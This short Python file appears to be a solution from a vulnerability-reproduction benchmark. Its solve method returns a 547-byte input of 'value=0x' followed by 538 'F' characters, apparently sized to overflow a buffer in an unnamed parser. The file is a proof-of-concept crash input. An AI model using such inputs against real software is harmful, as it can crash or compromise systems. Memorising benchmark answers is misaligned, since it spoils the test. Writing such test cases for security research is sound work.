import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        hex_len = 538  # 8 ("value=0x") + 538 + 1 ("\n") = 547 bytes total
        payload = b"value=0x" + b"F" * hex_len + b"\n"
        return payload